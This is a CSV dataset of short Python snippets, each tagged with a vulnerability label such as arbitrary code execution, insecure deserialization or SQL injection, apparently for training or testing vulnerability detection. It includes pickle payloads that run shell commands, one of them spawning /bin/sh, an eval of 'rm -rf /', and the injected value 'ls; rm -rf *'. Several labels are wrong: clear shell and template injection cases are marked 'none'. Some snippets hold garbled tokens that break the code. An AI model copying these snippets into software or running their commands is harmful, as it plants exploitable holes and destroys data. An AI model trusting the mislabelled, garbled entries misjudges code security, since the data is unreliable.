snippet,vulnerability
"def secure_function(user_input):
    max_length = 100
    if len(user_input) > max_length:
        raise ValueError(""Input too long"")
    buffer = bytearray(max_length)
    for i in range(len(user_input)):
        buffer[i] = user_input[i]
    return buffer
attacker_input = ""A"" * 200
try:
    print(secure_function(attacker_input))
except ValueError as e:
    print(e)",['none']
"import os
def command_execution(user_input):
    return eval(user_input)
user_input = input(""Enter your command: "")
command_execution(user_input)",['arbitrary_code_exec']
"import shlex
import subprocess
def execute_command(user_input):
    command = shlex.split(user_input)
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, error = process.communicate()
    return output, error
user_input = ""ls; rm -rf *""
execute_command(user_input)",['none']
"import pickle
import os
class VulnerableClass:
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked""',))
data = pickle.dumps(VulnerableClass())
pickle.loads(data)",['insecure_deserialization']
"import sys
sys.setrecursionlimit(3000)
def infinite_loop(n):
    if n >= 3000:
        return
    else:
        n += 1
        infinite_loop(n)
infinite_loop(0)",['none']
"import pickle
import os
import subprocess
class EvilClass(object):
    def __reduce__(self):
        return (subprocess.Popen, (['echo', 'Hacked!'],))
def serialize_and_write(obj, filename):
    with open(filename, 'wb') as f:
        pickle.dump(obj, f)Bs
def read_and_deserialize(filename):
    with open(filename, 'rb') as f:
        return pickle.load(f)",['insecure_deserialization']
"import os
import ctypes
def execute_command(user_input):
    command = user_input[:256]
    os.system(""echo '{}' > output.txt"".format(command))
def main():
    user_input = input(""Enter your command: "")
    execute_command(user_input)","['buffer_overflow', 'command_injection']"
"import os
def run_command(user_input):
    command = ""os."" + user_input
    eval(command)
run_command(""system('rm -rf /')"")",['arbitrary_code_exec']
"import struct
def unpack_data(data):
    try:
        return struct.unpack('L', data)
    except struct.error:
        print(""Invalid data"")
data = b'\x01\x02\x03\x04\x05\x06\x07\x08'
print(unpack_data(data))
exploit_data = b'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F'
print(unpack_data(exploit_data))",['none']
"def safe_function():
    user_input = input(""Enter some Python code: "")
    if any(char in user_input for char in ['import', 'os', 'sys', 'eval', 'exec', 'open', 'input']):
        print(""Sorry, this function does not support such operations."")
    else:
        try:
            result = eval(user_input)
            print(""Result: "", result)
        except Exception as e:
            print(""An error occurred: "", str(e))
safe_function()",['arbitrary_code_exec']
"class GlobalVariable:
    def __init__(self):
        self.x = None
    def set_global_variable(self):
        self.x = 10
    def modify_global_variable(self):
        self.x = ""Hello World"" Hawk""
gv = GlobalVariable()
gv.set_global_variable()
print(gv.x)
gv.modify_global_variable()
print(gv.x)",['none']
"import subprocess
def execute_command(user_input):
    command = 'ls ' + user_input
    output = subprocess.check_output(command, shell=True)
    return output
user_input = input(""Enter your command: "")
print(execute_command(user_input))",['none']
"import pickle
import os
class RunBinSh(object):
    def __reduce__(self):
        return (os.system, ('/bin/sh',))
def serialize_exploit():
    malicious = pickle.dumps(RunBinSh())
    with open('payload.dat', 'wb') as f:
        pickle.dump(malicious, f)
serialize_exploit()",['insecure_deserialization']
"import flask
app = flask.Flask(__name__)
@app.route('/execute', methods=['POST'])
def execute_code():
    code = flask.request.form.get('code')
    eval(code)
if __name__ == '__main__':
    app.run(port=8000)",['arbitrary_code_exec']
"import os
def run_code(user_input):
    eval(user_input)
def main():
    user_input = input(""Enter some Python code to execute: "")
    run_code(user_input)",['arbitrary_code_exec']
"import pickle
import subprocess
class SafeClass:
    def __init__(self):
        self.command = 'echo ""You have been hacked""'
    def __reduce__(self):
        return (subprocess.Popen, (self.command,))
data = pickle.dumps(SafeClass())
pickle.loads(data)",['insecure_deserialization']
"from flask import Flask, request
import sqlite3
app = Flask(__name__)
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username='{}' AND password='{}'"".format(username, password)
    cursor.execute(query)
    user = cursor.fetchone()
    if user:
        return 'Logged in successfully', 200
    else:
        return 'Invalid credentials', 401
if __name__ == '__main__':
    app.run(debug=True)",['sqli']
"import pickle
import subprocess
class SafePickle(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', 'You have been hacked'],))
def serialize_exploit():
    with open('exploit.pkl', 'wb') as f:
        pickle.dump(SafePickle(), f)
serialize_exploit()",['none']
"import re
def sanitize_input(user_input):
    if re.search('[a-zA-Z_]', user_input):
        return False
    return True
def safe_eval(user_input):
    if sanitize_input(user_input):
        return ast.literal_eval(user_input)
    else:ivalueError(""Invalid input"")",['none']
"import os
def unsafe_function(user_input):
    return eval(user_input)
print(unsafe_function('__import__(""os"").system(""ls"")'))",['arbitrary_code_exec']
"import ast
class UserInput:
    def __init__(self):
        self.user_input = input(""Enter your command: "")
class SecureCode:
    def __init__(self, user_input):
        self.user_input = user_input
    def execute(self):
        tree = ast.parse(self.user_input, mode='single')
        allowed_nodes = (ast.Expr, ast.Num, ast.BinOp, ast.UnaryOp, ast.Compare, ast.IfExp)
        for node in ast.walk(tree):
            if type(node) not in allowed_nodes:
                raise ValueError(f""Invalid expression: {type(node).__name__}"")
        compiled = compile(tree, filename=""<ast>"", mode=""eval"")
        eval(compiled)
def main():
    user_input = UserInput()
    secure_code = SecureCode(user_input.user_input)
    secure_code.execute()
if __name__ == ""__main__"":
    main()",['arbitrary_code_exec']
"import ast
class RestrictedPython(ast.NodeTransformer):
    def visit_Call(self, node):
        if not (isinstance(node.func, ast.Name) and node.func.id in ['eval', 'exec']):
            return self.generic_visit(node)
        else:
            raise ValueError('Eval/Exec usage detected')
def validate_code(code):
    tree = ast.parse(code, mode='single')
    RestrictedPython().visit(tree)
def execute_user_input():
    user_input = input(""Enter your command: "")
    validate_code(user_input)
    exec(user_input)
",['arbitrary_code_exec']
"import pickle
import os
import subprocess
class SafeClass:
    def __init__(self, cmd):
        self.cmd = cmd
    def execute_command(self):
        subprocess.call(self.cmd, shell=True)
def serialize_and_deserialize(obj):
    serialized = pickle.dumps(obj)
    deserialized = pickle.loads(serialized)
    return deserialized
safe_object = SafeClass('echo Attacker\'s command executed')
deserialized_object = serialize_and_deserialize(safe_object)
deserialized_object.execute_command()",['insecure_deserialization']
"def some_function(input_data):
    try:
        if type(input_data) == int:
            return str(input_data)
        elif type(input_data) == list:
            return [str(i) for i in input_data]
        elif type(input_data) == dict:
            return {k: v for k, v in input_data.items()}
        else:
            return input_data
    except Exception as e:
        Pass",['none']
"def create_function():
    exec('global_code = \""\"".join([chr(int(c)) for c in [97, 109, 98, 105, 116, 117, 115, 49]])')
    exec(global_code)
input_string = ""__import__('os').system('clear')""
exec('global_code = \""' + input_string + '\""')
create_function()
eval(global_code)",['arbitrary_code_exec']
"import os
def evaluate_input(user_input):
    return eval(user_input)
user_input = input(""Enter something to evaluate: "")
print(evaluate_input(user_input))",['arbitrary_code_exec']
"from flask import Flask, request, render_template_string
app = Flask(__name__)
@app.route('/')
def home():
    name = request.args.get('name', '')
    return render_template_string('Hello, %s!' % name)",['none']
"import pickle
import os
class VulnerableClass:
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))
vulnerable_object = VulnerableClass()
serialized_object = pickle.dumps(vulnerable_object)
deserialized_object = pickle.loads(serialized_object)",['insecure_deserialization']
"import ast
class UserInput:
    def __init__(self):
        self.user_input = input(""Enter your command: "")
class CommandExecutor:
    def execute(self, user_input):
        tree = ast.parse(user_input, mode='single')
        if not isinstance(tree.body[0], (ast.Expr, ast.Assign)):
            raise ValueError('Invalid command')
        elif isinstance(tree.body[0].value, ast.Call):
            func = tree.body[0].value.func
            if not isinstance(func, ast.Name) or func.id != 'print':
                raise ValueError('Invalid command')
        else:
            raise ValueError('Invalid command')
        exec(user_input)
def main():
    user_input = UserInput().user_input
    CommandExecutor().execute(user_input)",['arbitrary_code_exec']
